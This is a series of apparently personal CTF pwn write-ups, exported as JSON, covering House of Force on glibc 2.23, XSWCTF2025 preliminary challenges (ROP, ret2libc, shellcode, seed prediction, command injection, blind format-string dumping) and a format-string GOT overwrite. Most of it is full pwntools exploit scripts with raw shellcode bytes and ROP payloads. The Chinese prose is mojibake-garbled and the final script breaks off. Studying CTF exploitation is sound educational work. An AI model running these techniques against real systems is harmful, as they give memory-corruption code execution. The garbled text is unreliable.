[{"content":"ä»¥glibc2.23ä¸ºä¾‹\nåˆ©ç”¨æ¡ä»¶\nå¯ä»¥ä¿®æ”¹top chunkçš„sizeä½ å¯¹ç”³è¯·å †å—çš„å¤§å°æ²¡æœ‰æ£€æµ‹ åŸç†ï¼Œå…ˆä¿®æ”¹top chunkçš„sizeï¼Œç„¶åè®¡ç®—top chunkä¸ä»»æ„åœ°å€çš„ä½ç½®ï¼Œç”³è¯·ä¸€ä¸ªå¤§chunkï¼Œå°†top chunkåœ°å€æ”¹ä¸ºæˆ‘ä»¬è¦ä¿®æ”¹çš„åœ°å€é™„è¿‘ï¼Œç„¶åå†æ¬¡ç”³è¯·åˆé€‚å¤§å°chunkåå¯¹è¯¥chunkè¿›è¡Œä¿®æ”¹å°±è¡Œå®ç°ä»»æ„åœ°å€å†™\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 victim = av-\u0026gt;top; size = chunksize (victim); if ((unsigned long) (size) \u0026gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u0026gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } ä¾‹é¢˜ BUUCTF\ngyctf_2020_force 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 void __fastcall __noreturn main(int a1, char **a2, char **a3) { __int64 v3; // rax char s[256]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v5; // [rsp+118h] [rbp-8h] v5 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); memset(s, 255, sizeof(s)); while ( 1 ) { memset(s, 255, sizeof(s)); puts(\u0026#34;1:add\u0026#34;); puts(\u0026#34;2:puts\u0026#34;); read(0, nptr, 0xFuLL); v3 = atol(nptr); if ( v3 == 1 ) { add(); } else if ( v3 == 2 ) { put(); } } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 unsigned __int64 add() { const void **i; // [rsp+0h] [rbp-120h] __int64 size; // [rsp+8h] [rbp-118h] char s[256]; // [rsp+10h] [rbp-110h] BYREF unsigned __int64 v4; // [rsp+118h] [rbp-8h] v4 = __readfsqword(0x28u); memset(s, 255, sizeof(s)); for ( i = (const void **)\u0026amp;unk_202080; *i; ++i ) ; if ( (char *)i - (char *)\u0026amp;unk_202080 \u0026gt; 39 ) exit(0); puts(\u0026#34;size\u0026#34;); read(0, nptr, 0xFuLL); size = atol(nptr); *i = malloc(size); if ( !*i ) exit(0); printf(\u0026#34;bin addr %p\\n\u0026#34;, *i); puts(\u0026#34;content\u0026#34;); read(0, (void *)*i, 0x50uLL); puts(\u0026#34;done\u0026#34;); return __readfsqword(0x28u) ^ v4; } glibc çš„ malloc åˆ†é…å†…å­˜æœ‰ä¸¤ç§æ ¸å¿ƒæ–¹å¼ï¼Œç”¨ é˜ˆå€¼ åŒºåˆ†ï¼šå½“ç”³è¯·chunkå¤§å°å°äºé˜ˆå€¼æ—¶ï¼Œé‡‡ç”¨brkåˆ†é…ï¼Œ ä»è¿›ç¨‹heapæ®µæ‰©å±•ï¼Œåœ°å€è¿ç»­ ï¼›å½“ç”³è¯·chunkå¤§å°å¤§äºé˜ˆå€¼æ—¶ï¼Œä½¿ç”¨mmapåˆ†é…ï¼Œ å‘å†…æ ¸ç”³è¯·ç‹¬ç«‹çš„å†…å­˜ï¼Œä¸libcbaseåç§»å›ºå®šï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¥æ³„éœ²libcbase\næå‰å°†/bin/shå†™å…¥topï¼Œç„¶ååˆ©ç”¨house of forceä¿®æ”¹malloc_hookä¸ºsystem,å†æ¬¡mallocæ—¶ä¼ å…¥binsh(sizeå€¼åŸæœ¬æˆ‘ä»¬ç»™çš„æ˜¯æ•°å€¼,ä¼šæŠŠè¿™ä¸ªæ•°å€¼ç»™ rdiï¼Œç°åœ¨ç»™çš„æ˜¯ top chunk åœ°å€ï¼Œç»™ rdi çš„å€¼å°±æ˜¯top chunk çš„å†…å®¹)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 from pwn import* context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p=process(\u0026#39;./pwn\u0026#39;) #p=remote(\u0026#39;node5.buuoj.cn\u0026#39;,25688) elf=ELF(\u0026#39;./pwn\u0026#39;) #libc=ELF(\u0026#39;./libc-2.23.so\u0026#39;) libc=ELF(\u0026#39;/home/fuguang/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6\u0026#39;) def add(size,content): p.recvuntil(b\u0026#39;2:puts\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.sendlineafter(b\u0026#39;size\u0026#39;,str(size)) p.recvuntil(b\u0026#39;0x\u0026#39;) addr=int(p.recv(12),16) p.sendafter(b\u0026#39;content\u0026#39;,content) return addr libcbase=add(9999999999,b\u0026#39;a\u0026#39;*8)+0x2540beff0 print(hex(libcbase)) top = add(0x18,b\u0026#39;a\u0026#39;*0x10+b\u0026#39;/bin/sh\\x00\u0026#39;+p64(0xFFFFFFFFFFFFFFFF))+0x10 malloc_hook=libc.sym[\u0026#39;__malloc_hook\u0026#39;]+libcbase print(hex(malloc_hook)) system=libc.sym[\u0026#39;system\u0026#39;] print(hex(system)) offset = (malloc_hook-0x20)-top print(hex(offset)) addr=add(offset, b\u0026#39;aaa\u0026#39;) addr1=addr+offset log.success(\u0026#34;addr1 :\u0026#34;+hex(addr1)) system=libc.sym[\u0026#39;system\u0026#39;]+libcbase addr2=add(0x10,p64(system)) log.success(\u0026#34;addr2 :\u0026#34;+hex(addr2)) p.recvuntil(b\u0026#39;2:puts\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) gdb.attach(p) p.sendlineafter(b\u0026#39;size\u0026#39;,str(top)) p.interactive() å¦ä¸€ç§è§£æ³• ,one_gadget,reallocæŠ¬rsp,å…³äºreallocçš„è§£é‡Šå¦‚ä¸‹ https://blog.csdn.net/Invin_cible/article/details/123042819\nç¢ç¢å¿µï¼šç”±äºæœŸæœ«å‘¨å¤ä¹ åŸå› å¥½ä¹…è‡³å°‘ä¸€ä¸ªæœˆæ²¡å­¦pwnäº†ï¼Œæœ¬æ¥å¤ç°äº†XSWåˆèµ›æ²¡è§£å‡ºçš„é¢˜ä½†æ˜¯æ²¡æœ‰æ¥å¾—åŠå†™wp,åé¢å°½é‡æ‰¾æ—¶é—´ä¸ä¸Šï¼Œè™½ç„¶å¤§å­¦å¥½å¿™ä½†æ˜¯åŠ æ²¹åŠ æ²¹\n","date":"2026-02-02T00:43:28+08:00","image":"http://localhost:1313/image/House_of_force.jpg","permalink":"http://localhost:1313/p/house-of-forcegyctf_2020_force/","title":"House of force\u0026\u0026gyctf_2020_force"},{"content":"ezzzzz_overflow å¼€äº†NXä¿æŠ¤ï¼Œscanfå‡½æ•°å­˜åœ¨æ— é™æ ˆæº¢å‡ºï¼Œæœ‰åé—¨ï¼Œret2text\n1 2 3 4 5 6 7 8 9 10 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,64762) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;you name?\u0026#39;) shell=0x4011b6 ret=0x4012AA pay=b\u0026#39;a\u0026#39;*(0x20+8)+p64(shell) p.sendline(pay) p.interactive() roprop æœ‰NXå’Œpie\n1 2 3 4 5 6 7 8 9 10 11 12 int __fastcall main(int argc, const char **argv, const char **envp) { __int64 buf[4]; // [rsp+0h] [rbp-20h] BYREF init(argc, argv, envp); printf(\u0026#34;welcome to xswctf!!\u0026#34;); memset(buf, 0, sizeof(buf)); puts(\u0026#34;here is a gift.\u0026#34;); printf(\u0026#34;%p\\n\u0026#34;, gift); read(0, buf, 0x50uLL); return 0; } ç»™äº†giftåœ°å€ç”¨æ¥ç»•è¿‡pie,æ²¡æœ‰åé—¨ï¼Œæœ‰systemplt,gadgetå’Œ/bin/shå­—ä¸²ï¼Œæ‰“rop\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,54036) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;welcome to xswctf!!here is a gift.\u0026#39;) p.recvuntil(b\u0026#39;0x\u0026#39;) pie=int(p.recv(12),16)-0x4038 print(hex(pie)) sys=pie+0x1040 binsh=pie+0x4048 rdi=pie+0x11f4 ret=pie+0x1016 pay=b\u0026#39;a\u0026#39;*(0x20+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys)+p64(0) p.sendline(pay) p.interactive() shellcodeçš„è‰ºæœ¯(å°é²œç‰ˆ) æ— NXæœ‰pie\n1 2 3 4 5 6 7 8 9 10 void vuln() { char buf[312]; // [rsp+0h] [rbp-140h] BYREF unsigned __int64 v1; // [rsp+138h] [rbp-8h] v1 = __readfsqword(0x28u); puts(\u0026#34;ä½ çŸ¥é“shellcodeæ˜¯ä»€ä¹ˆå—ï¼Œè¯•ç€ç¼–å†™ä½ è‡ªå·±çš„shellcodeå§\u0026#34;); read(0, buf, 0x12CuLL); __asm { jmp rsi } } ç¨‹åºå…ˆå‘bufä¸­æ•°æ®ç„¶åæ‰§è¡Œå…¶å†…å®¹ æ‰€ä»¥ret2shellcode\n1 2 3 4 5 6 7 8 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,52425) context(log_level=\u0026#39;debug\u0026#39;, arch=\u0026#39;amd64\u0026#39;) shellcode = b\u0026#34;\\x6a\\x3b\\x58\\x99\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x52\\x53\\x54\\x5f\\x52\\x5e\\x0f\\x05\u0026#34; p.send(shellcode) p.interactive() æ•°å­—ç‚¸å¼¹bomb! ä¿æŠ¤å…¨å¼€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 int __fastcall main(int argc, const char **argv, const char **envp) { unsigned int v3; // eax int v5; // [rsp+0h] [rbp-30h] BYREF int i; // [rsp+4h] [rbp-2Ch] int v7; // [rsp+8h] [rbp-28h] int v8; // [rsp+Ch] [rbp-24h] char buf[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v10; // [rsp+28h] [rbp-8h] v10 = __readfsqword(0x28u); init(argc, argv, envp); v3 = time(0LL); srand(v3); v7 = rand() % 500; puts(\u0026#34;è®©æˆ‘ä»¬æ¥ç©æ•°å­—ç‚¸å¼¹å§!!!ä½†è¿™æ¬¡æ˜¯çŒœä¸­æœ‰å¥–å“¦~~~~\u0026#34;); printf(\u0026#34;è¯·è¾“å…¥ä½ çš„æ¸¸æˆID: \u0026#34;); v8 = read(0, buf, 0x14uLL); buf[v8 - 1] = 0; printf(buf); puts(\u0026#34;,æ¬¢è¿æ‚¨ï¼\u0026#34;); puts(\u0026#34;---------------------------------------------------\u0026#34;); puts(\u0026#34; æ¸¸æˆå¼€å§‹ \u0026#34;); for ( i = 0; i \u0026lt;= 2; ++i ) { printf(\u0026#34;çŒœçŒœæˆ‘çš„ç‚¸å¼¹æ˜¯ä»€ä¹ˆ(æç¤º----åœ¨[0,500)ä¸­å“¦)ï¼š \u0026#34;); __isoc99_scanf(\u0026amp;unk_214C, \u0026amp;v5); if ( v7 == v5 ) win(); if ( v7 \u0026gt; v5 ) puts(\u0026amp;byte_214F); if ( v7 \u0026lt; v5 ) puts(\u0026#34;å˜¶ï¼Œï¼Œå¤§äº†å‘¢\u0026#34;); } puts(\u0026#34;---------------------------------------------------\u0026#34;); puts(\u0026#34; æ¸¸æˆç»“æŸ \u0026#34;); puts(\u0026amp;byte_21B0); return 0; } æ˜¯ä¸€ä¸ªä¼ªéšæœºç»•è¿‡ é¢˜ç›®ç”¨äº†v3 = time(0LL); æ‰€ä»¥æˆ‘ä»¬çš„ç§å­ä¹Ÿè®¾ä¸ºå½“å‰æ—¶é—´å°±å¥½\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 from pwn import * import time import ctypes #p=process(\u0026#39;./pwn\u0026#39;) libc=ctypes.CDLL(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,59068) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) seed = int(time.time()) libc.srand(seed) p.recvuntil(b\u0026#39;ID: \u0026#39;) p.send(b\u0026#39;a\u0026#39;) ans=str(libc.rand() % 500) p.recvuntil(\u0026#39;ï¼š \u0026#39;) p.sendline(ans.encode()) p.interactive() Pikachu æ²¡æœ‰åé—¨ ä½†æ˜¯editå’Œaddéƒ½æœ‰æ ˆæº¢å‡ºï¼Œå¯ä»¥æ‰¾åˆ°pop rdi äºæ˜¯ret2libc,æˆ‘ç”¨çš„æ˜¯addå‡½æ•°\néœ€è¦æ³¨æ„çš„æ˜¯, è¯»å…¥payloadçš„æ—¶ä¼šè¦†ç›–v3ï¼Œæ‰€ä»¥payloadéœ€è¦ä¿è¯v3çš„å€¼ä¸å˜å¦‚\n1 pay1=b\u0026#39;a\u0026#39;*(0x110-4)+p32(0)+p64(0)+p64(rdi)+p64(putsgot)+p64(putsplt)+p64(addd) çš„p32(0)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 int add() { _QWORD *v0; // rax char buf[268]; // [rsp+0h] [rbp-110h] BYREF unsigned int v3; // [rsp+10Ch] [rbp-4h] BYREF puts(\u0026#34;input index:\u0026#34;); v3 = 0; __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;v3); if ( v3 \u0026lt; 0xA ) { if ( p[v3] ) { LODWORD(v0) = puts(\u0026#34;The element already exists in the array.\u0026#34;); } else { puts(\u0026#34;input content:\u0026#34;); read(0, buf, 0x200uLL); v0 = p; p[v3] = gift; } } else { LODWORD(v0) = puts(\u0026#34;Array out of bounds\u0026#34;); } return (int)v0; } from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) libc=ELF(\u0026#39;./libc.so.6\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,52538) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) def add(idx,content): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;input content:\u0026#39;) p.send(content) def edit(idx,content): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;2\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) p.recvuntil(b\u0026#39;input content:\u0026#39;) p.send(content) def dele(idx): p.recvuntil(b\u0026#39;5.exit\u0026#39;) p.sendline(b\u0026#39;3\u0026#39;) p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(str(idx).encode()) rdi=0x4011cb putsgot=0x404000 putsplt=0x401030 main=0x40152d addd=0x401240 pay1=b\u0026#39;a\u0026#39;*(0x110-4)+p32(0)+p64(0)+p64(rdi)+p64(putsgot)+p64(putsplt)+p64(addd) #gdb.attach(p) add(0,pay1) p.recv(1) #-0x835a0 libcbase=u64(p.recv(6).ljust(8,b\u0026#39;\\x00\u0026#39;))-0x805a0 print(hex(libcbase)) #gdb.attach(p) sys=libcbase+libc.symbols[\u0026#39;system\u0026#39;] binsh = libcbase + 0x1a7ea4 ret=0x401016 ogg1=libcbase+0xddf43 ogg2=libcbase+0xfb06a p.recvuntil(b\u0026#39;input index:\u0026#39;) p.sendline(b\u0026#39;1\u0026#39;) p.recvuntil(b\u0026#39;input content:\u0026#39;) pay2=b\u0026#39;a\u0026#39;*(0x110-4)+p32(1)+p64(0)+p64(ret)+p64(rdi)+p64(binsh)+p64(sys) print(hex(libcbase)) print(hex(binsh)) print(hex(sys)) #gdb.attach(p) p.send(pay2) p.interactive() AAAAæ–‡ä»¶è¯»å–ç³»ç»Ÿ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 void *__fastcall cat(void *a1) { char dest[8]; // [rsp+10h] [rbp-40h] BYREF __int64 v3; // [rsp+18h] [rbp-38h] __int64 v4; // [rsp+20h] [rbp-30h] __int64 v5; // [rsp+28h] [rbp-28h] __int64 v6; // [rsp+30h] [rbp-20h] __int64 v7; // [rsp+38h] [rbp-18h] __int16 v8; // [rsp+40h] [rbp-10h] *(_QWORD *)dest = 544498019LL; v3 = 0LL; v4 = 0LL; v5 = 0LL; v6 = 0LL; v7 = 0LL; v8 = 0; strcat(dest, file); system(dest); return 0LL; } void __noreturn vuln() { pthread_t newthread; // [rsp+8h] [rbp-8h] BYREF puts(\u0026amp;s); puts(\u0026#34;è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œæœ‰ä»¥ä¸‹æ–‡ä»¶â€”â€”\u0026#34;); system(\u0026#34;ls\u0026#34;); while ( 1 ) { puts(\u0026#34;æ‰€ä»¥ä½ æƒ³çŸ¥é“å“ªä¸ªæ–‡ä»¶çš„å†…å®¹å‘¢~ğŸ˜:\u0026#34;); __isoc99_scanf(\u0026amp;aS, file); if ( !strcmp(file, v1) ) puts(\u0026#34;æŠ±æ­‰ï¼Œå°±æ˜¯ä¸ç»™ä½ çœ‹è¿™ä¸ªæ–‡ä»¶å‘¢~~~~~~~~~~\u0026#34;); else pthread_create(\u0026amp;newthread, 0LL, cat, 0LL); } } å®¡è¯»æºç  å¦‚æœæ–‡ä»¶åä¸ä¸ºflagï¼Œcatå‡½æ•°ä¼šæŠŠæ–‡ä»¶åæ‹¼æ¥åˆ°deatåç„¶åæ‰§è¡Œï¼Œè™½ç„¶ä¸çŸ¥é“ä¸ºä»€ä¹ˆsystem(dest+å‘½ä»¤ä¹Ÿèƒ½æ‰§è¡Œä½†æ˜¯ç¡®å®å¯ä»¥ï¼ˆ æ­£å¸¸æƒ…å†µä¸‹åº”è¯¥;ï¼‹å‘½ä»¤è¿›è¡Œå¤šæ¡å‘½ä»¤æ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 from pwn import * #p=process(\u0026#39;./pwn\u0026#39;) p=remote(\u0026#39;192.168.248.1\u0026#39;,60786) context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;) p.recvuntil(b\u0026#39;:\u0026#39;) sys=0x4010b0 binsh=0x004020cd #pay=b\u0026#39;a\u0026#39;*0x40+p64(sys) pay=b\u0026#39;cat /flag\u0026#39; p.sendline(pay) p.interactive() nofile fmtç›²æ‰“ï¼Œä»ç½‘ä¸Šæœäº†ä¸€ä¸‹éœ€è¦å…ˆdumpæ–‡ä»¶å†…å®¹ï¼Œæ¨¡ä»¿äº†ä¸€ä¸ªè„šæœ¬å¦‚ä¸‹ï¼Œä»0x40000å¼€å§‹æ³„éœ²\nä½†æ˜¯æ³„éœ²çš„elfæ–‡ä»¶ä¸å®Œæ•´ï¼Œäºæ˜¯åˆä¸Šç½‘æœ å‘ç°\nè¿™æ ·è®¾ç½®çš„è¯å¯ä»¥æ‰“å¼€æ–‡ä»¶\nè¯»æ±‡ç¼–å‘ç°name=y0u_kn0w_c6c?çš„æ—¶å€™è·å¾—shell\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 import os import sys import time from pwn import * from ctypes import * import binascii context.os = \u0026#39;linux\u0026#39; context.log_level = \u0026#34;debug\u0026#34; x64_32 = 1 if x64_32: context.arch = \u0026#39;amd64\u0026#39; else: context.arch = \u0026#39;i386\u0026#39; # å¢åŠ è¶…æ—¶è®¾ç½®ï¼Œé˜²æ­¢æ— é™ç­‰å¾… p = remote(\u0026#39;192.168.248.1\u0026#39;, 58731, timeout=5) begin = 0x400000 bin_data = b\u0026#39;\u0026#39; def leak(addr): \u0026#34;\u0026#34;\u0026#34; å°è¯•æ³„éœ²æŒ‡å®šåœ°å€çš„æ•°æ®ã€‚ å¦‚æœæˆåŠŸï¼Œè¿”å›æ³„éœ²çš„æ•°æ®ï¼ˆä¸å«\u0026#39;dump\u0026#39;ï¼‰ã€‚ å¦‚æœå¤±è´¥ï¼ˆè¶…æ—¶æˆ–è¿æ¥å…³é—­ï¼‰ï¼Œè¿”å› Noneã€‚ \u0026#34;\u0026#34;\u0026#34; try: pl = b\u0026#34;%7$sdump\u0026#34; + p64(addr) p.sendafter(b\u0026#39;Please enter your answer\\n\u0026#39;, pl) data = p.recvuntil(b\u0026#39;dump\u0026#39;, drop=True) return data except (pwnlib.exception.PwnlibTimeoutError, EOFError): return None try: while True: print(f\u0026#34;[*] Trying to leak address: 0x{begin:016x}\u0026#34;) data = leak(begin) if data is None: # å¦‚æœ leak è¿”å› Noneï¼Œè¯´æ˜å·²ç»æ²¡æœ‰æ•°æ®å¯ä»¥è¯»å–äº† print(\u0026#34;[!] No more data received. Exiting loop.\u0026#34;) break if not data: # å¦‚æœè¿”å›ç©ºå­—èŠ‚ä¸² b\u0026#39;\u0026#39; # è¿™é€šå¸¸æ„å‘³ç€æ³„éœ²çš„å°±æ˜¯ç©ºæ•°æ® bin_data += b\u0026#39;\\x00\u0026#39; begin += 1 else: bin_data += data begin += len(data) except Exception as e: print(f\u0026#34;[!] An error occurred: {e}\u0026#34;) finally: print(f\u0026#39;[+] Dump finished. Total length: {len(bin_data)} bytes.\u0026#39;) with open(\u0026#39;dump_bin\u0026#39;, \u0026#39;wb\u0026#39;) as f: f.write(bin_data) # å°è¯•å…³é—­è¿æ¥ try: p.close() except: pass from pwn import * p = remote(\u0026#39;192.168.248.1\u0026#39;, 58731) p.recvuntil(b\u0026#39;Please enter your answer\u0026#39;) p.send(b\u0026#39;y0u_kn0w_c6c?\u0026#39;) p.interactive() ","date":"2025-12-06T23:34:28+08:00","image":"http://localhost:1313/image/XSWCTF_2.jpg","permalink":"http://localhost:1313/p/xswctf2025%E5%88%9D%E8%B5%9Bpwn-wp/","title":"XSWCTF2025åˆèµ›Pwn wp"},{"content":"ç”±äºæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸Šï¼Œæ— æ³•ç›´æ¥å°†æƒ³è¦æ”¹å†™çš„åœ°å€æŒ‡é’ˆæ”¾ç½®åœ¨æ ˆä¸Šï¼Œä¹Ÿå°±æ²¡åŠæ³•å®ç°ä»»æ„åœ°å€å†™ã€‚é‚£ä¹ˆå°±è¦æƒ³åŠæ³•å°†æƒ³æ”¹å†™çš„åœ°å€æŒ‡é’ˆæ”¾åˆ°æ ˆä¸Š\n%x$n å†™åœ°å€æ—¶æ˜¯å°†æ­¤å¤„æ•°æ®ä½œä¸ºæŒ‡é’ˆï¼Œæ”¹å†™çš„æ˜¯è¯¥æŒ‡é’ˆæŒ‡å‘çš„å†…å®¹\nA\u0026ndash;\u0026gt; B\u0026ndash;\u0026gt; C\u0026ndash;\u0026gt; å‡è®¾Açš„åç§»ä¸ºxï¼Œ%x$nä¼šå°†Bä½œä¸ºæŒ‡é’ˆï¼Œæ”¹å†™å…¶æŒ‡å‘çš„å†…å®¹C\nå¦‚æœæˆ‘ä»¬æƒ³ä¿®æ”¹printfçš„gotè¡¨ï¼Œé¦–å…ˆéœ€è¦å¦‚ä¸‹ç»“æ„\nD\u0026ndash;\u0026gt; printf@got printfçœŸå®åœ°å€ æ ˆä¸Šæ²¡æœ‰è¿™ç§ç»“æ„ï¼Œæˆ‘ä»¬æ‰¾ç›¸ä¼¼åœ°å€ç„¶åä¿®æ”¹ä½å­—èŠ‚ä»è€Œå‘æ ˆä¸Šå†™å…¥got\nprintf_gotåœ°å€ä¸º0x404028\nè¿™ä¸ªå°±å¾ˆåƒ\nï¼ˆè¿™ä¸ªå›¾å’Œå…¶ä»–å›¾ä¸æ˜¯åœ¨åŒä¸€æ¬¡è¿è¡Œï¼‰\nåˆ©ç”¨è¿™ä¸ªä¸‰è¿æŒ‡é’ˆç»“æ„ï¼Œå°†ä¿®æ”¹ä½äºŒå­—èŠ‚æˆä¸ºä¸Šé¢çš„\nä¿®æ”¹å®Œæ¯•åå¦‚ä¸Š ï¼Œå‡ºç°äº†ï¼Œå¯ä»¥ä¿®æ”¹0x40136fä½äºŒå­—èŠ‚ä½¿å…¶æˆä¸ºprintf@got\nå‡ºç°äº†D\u0026ndash;\u0026gt;printf@got\u0026ndash;\u0026gt;printfçœŸå®åœ°å€ çš„ç»“æ„ï¼Œä¿®æ”¹printfçœŸå®åœ°å€çš„ä½å››å­—èŠ‚ä½¿å…¶æˆä¸ºsystemçœŸå®åœ°å€\nä¾‹é¢˜moectf2025_fmt_S ä¸Šé¢çš„è®²è§£å°±æ˜¯ä»¥è¿™ä¸ªé¢˜ä¸ºä¾‹çš„\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 int __fastcall main(int argc, const char **argv, const char **envp) { int i; // [rsp+Ch] [rbp-4h] init(argc, argv, envp); puts(\u0026#34;You\u0026#39;re walking down the road when a monster appear.\u0026#34;); for ( i = 1; i \u0026lt;= 3 \u0026amp;\u0026amp; !flag; ++i ) talk(); if ( (unsigned __int64)atk \u0026lt;= 0337522 ) puts(\u0026#34;You\u0026#39;ve been eaten by the monster.\u0026#34;); else he(); return 0; } 1 2 3 4 5 6 7 8 9 10 size_t talk() { puts(\u0026#34;You start talking to him...\u0026#34;); *(_DWORD *)\u0026amp;flag ^= 1u; read(0, fmt, 0x20uLL); printf(fmt); puts(\u0026#34;?\u0026#34;); puts(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;); return my_read(\u0026amp;atk, 8uLL); } 1 2 3 4 5 size_t __fastcall my_read(_BYTE *a1, size_t a2) { a1[read(0, a1, a2)] = 0; return strlen(a1); } 1 2 3 4 5 6 7 8 9 10 11 unsigned __int64 he() { char command[6]; // [rsp+2h] [rbp-Eh] BYREF unsigned __int64 v2; // [rsp+8h] [rbp-8h] v2 = __readfsqword(0x28u); qmemcpy(command, \u0026#34;a_flag\u0026#34;, sizeof(command)); puts(\u0026#34;The monster is defeated, and you obtain: flag?\u0026#34;); system(command); return v2 - __readfsqword(0x28u); } expå¦‚ä¸‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 from pwn import * context(log_level=\u0026#34;debug\u0026#34;,arch=\u0026#34;amd64\u0026#34;) p=process(\u0026#39;./pwn\u0026#39;) #p=remote(\u0026#39;node5.anna.nssctf.cn\u0026#39;,26001) #p=remote(\u0026#39;192.168.40.1\u0026#39;,51743) #gdb.attach(p,\u0026#39;b *0x4011D6\u0026#39;) #gdb.attach(p) #p=remote(\u0026#39;113.45.176.209\u0026#39;,9998) #p=remote(\u0026#39;1.95.36.136\u0026#39;,2102) elf = ELF(\u0026#34;./pwn\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) printf_got=0x404028 p.recvuntil(b\u0026#39;You start talking to him...\u0026#39;) p.sendline(b\u0026#39;%8$paaaa%13$p\u0026#39;) p.recvuntil(b\u0026#39;0x\u0026#39;) stack = int(p.recv(12), 16) p.recvuntil(b\u0026#39;aaaa0x\u0026#39;) libcbase = int(p.recv(12), 16)- 0x29d90 system=libcbase+libc.sym[\u0026#39;system\u0026#39;] print(hex(stack)) print(hex(libcbase)) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) #change i stack1 = stack - 0x4 a = stack1 \u0026amp; 0xffff payload = b\u0026#39;%\u0026#39; + str(a).encode() + b\u0026#39;c%6$hn\u0026#39; p.sendline(payload) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) p.recvuntil(\u0026#34;You start talking to him...\u0026#34;) p.sendline(b\u0026#39;%47$hn\u0026#39;) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) stack2=stack+0x18 b=stack2 \u0026amp; 0xffff pay2=b\u0026#39;%\u0026#39;+str(b).encode()+b\u0026#39;c%34$hn\u0026#39; p.sendline(pay2) p.sendlineafter(\u0026#34;You enraged the monster-prepare for battle!\u0026#34;, b\u0026#39;a\u0026#39; * 7) #change i stack1 = stack - 0x4 a = stack1 \u0026amp; 0xffff payload = b\u0026#39;%\u0026#39; + str(a).encode() + b\u0026#39;c%6$hn\u0026#39; p.sendline(payload) 